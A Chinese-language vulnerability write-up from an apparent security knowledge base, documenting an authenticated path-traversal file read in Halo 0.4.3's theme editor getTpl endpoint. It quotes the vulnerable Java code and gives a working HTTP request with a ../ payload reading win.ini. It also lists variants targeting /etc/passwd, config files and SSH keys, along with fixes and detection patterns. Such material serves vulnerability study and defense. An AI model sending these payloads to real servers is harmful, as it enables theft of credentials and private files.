---
id: web-java-component-halo-theme-gettpl-path-traversal-read
title: Halo 0.4.3 后台主题编辑 getTpl：tplName 未过滤 ../ 路径穿越任意文件读取
type: scenario
domain: web
path: web/java/component
technique: halo-theme-gettpl-path-traversal-read
aliases:
- Halo 任意文件读取
- Halo getTpl 路径穿越
- ThemeController 任意文件读取
- Halo 主题模板读取
tags:
- java
- halo
- spring-boot
- path-traversal
- arbitrary-file-read
- theme
- authenticated
cve: []
severity: high
confidence: high
status: verified
affected_versions: Halo 0.4.3（原文复现版本，未给出受影响区间）
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V57
  verified_at: '2026-11-05T08:50:06+08:00'
  notes: 已对照原文与图15-19核对：ThemeController.getTplContent 第265-283行将 tplName 直接 append 到 templates/themes/<THEME>/ 后 new File + FileReader.readString，无规范化/白名单；图18断点显示 themesPath=C:\Users\21865\Downloads\halo-0.4.3\...\templates\themes\anatole\module\comment.ftl，图19 GET /admin/themes/getTpl?tplName=../../../../../../../../../../Windows/win.ini 返回 win.ini 内容，穿越读取成立。affected_versions 按原文仅标注复现版本 0.4.3、未给区间，未猜。PoC未在本机执行；frontmatter无sources/source_url（全库惯例）。
---

## 一句话结论

Halo 0.4.3 后台主题编辑器的 `/admin/themes/getTpl` 把 `tplName` 直接拼到 `templates/themes/<主题>/` 后交给 `FileReader.readString()`，未过滤 `../`；拥有后台会话的攻击者可用路径穿越读取应用进程有权限的任意文件（原文实测读到 `C:\Windows\win.ini`）。

## 原理

- `ThemeController.getTplContent()` 的核心逻辑：

  ```java
  @GetMapping(value = "/getTpl", produces = "text/text;charset=UTF-8")
  @ResponseBody
  public String getTplContent(@RequestParam("tplName") String tplName) {
      String tplContent = "";
      try {
          final File basePath = new File(ResourceUtils.getURL("classpath:").getPath());
          final StringBuilder themePath = new StringBuilder("templates/themes/");
          themePath.append(BaseController.THEME);
          themePath.append("/");
          themePath.append(tplName);
          final File themesPath = new File(basePath.getAbsolutePath(), themePath.toString());
          final FileReader fileReader = new FileReader(themesPath);
          tplContent = fileReader.readString();
      } catch (Exception e) { ... }
      return tplContent;
  }
  ```

  `tplName` 作为字符串直接拼入路径，`new File(parent, child)` 不做规范化，`FileReader` 按最终路径打开文件；没有 `getCanonicalPath()`/`startsWith` 校验，也没有拒绝 `..`。
- 文件系统在打开时解析 `..`，`tplName=../../../../.../Windows/win.ini` 会跳出主题目录；读取结果直接作为 HTTP 响应体返回，形成有回显的任意文件读取。
- 正常情况下前端用 `tplName=module/comment.ftl` 读取主题模板；攻击者只需修改该参数即可读取任意文件，不需要上传或写入权限。
- 读取内容限制为 Halo 进程可读的文件；配置、密钥、源码等敏感文件通常满足。

## 触发条件

- Halo 0.4.3（原文复现版本），`/admin/themes/getTpl` 可访问。
- 攻击者持有有效后台会话（原文请求携带登录后的 `JSESSIONID`，Referer 为 `/admin/themes/editor`）。
- 目标文件对 Halo 进程可读；`../` 级数按 classpath 实际目录层级调整。
- 接口响应直接回显文件内容（`Content-Type: text/text;charset=UTF-8`）。

## 利用步骤

1. 登录后台进入“外观 → 主题编辑”，任意打开一个模板文件，抓取 `GET /admin/themes/getTpl?tplName=module%2Fcomment.ftl` 请求。
2. 先确认正常读取（响应为模板内容），再逐步增加 `../` 级数，直到读到已知系统文件。
3. 原文用 `tplName=../../../../../../../../../../Windows/win.ini` 成功返回 `win.ini` 内容。
4. 按需读取应用配置、数据库凭据、源码、SSH 私钥等，作为横向移动素材。

## PoC

```http
GET /admin/themes/getTpl?tplName=../../../../../../../../../../Windows/win.ini HTTP/1.1
Host: localhost:8090
Cookie: JSESSIONID=<有效后台会话>
Accept: */*
Referer: http://localhost:8090/admin/themes/editor
X-Requested-With: XMLHttpRequest
```

```text
HTTP/1.1 200 OK
Content-Type: text/text;charset=UTF-8

; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

## 变体与关联

- 变体：Windows 下可用 `..\..\`、盘符绝对路径；Linux 下读取 `/etc/passwd`、应用 `application.yml` 等；若存在前置过滤可尝试 URL 编码/双重编码。
- 关联：`[[web-java-component-halo-theme-savetpl-path-traversal-write]]`（同一 `tplName` 拼接方式的写入方向）、`[[web-generic-file-inclusion-java-new-file-root-path-traversal-read]]`（通用 `new File(root,path)` 读取原理）。
- 边界：需要后台会话；只能读取进程有权限的文件；若容器化部署，可读范围限于容器文件系统，但仍可能读到配置与凭据。

## 检测与防御

- 修复：`tplName` 使用模板文件白名单（仅允许已知 `.ftl` 相对路径），拒绝 `..`、`/` 开头、`\`、盘符与绝对路径；`getCanonicalPath()` 后校验必须以主题模板目录为前缀。
- 加固：主题编辑接口仅对可信管理员开放并审计；应用进程最小权限运行，敏感配置移出可读范围或加密。
- 检测：`/admin/themes/getTpl` 的 `tplName` 含 `../`、`..\\`、`%2e%2e`、绝对路径；响应出现 `[fonts]`、`/etc/passwd`、`password=`、私钥头等特征；同一会话短时间内读取多个非模板文件。
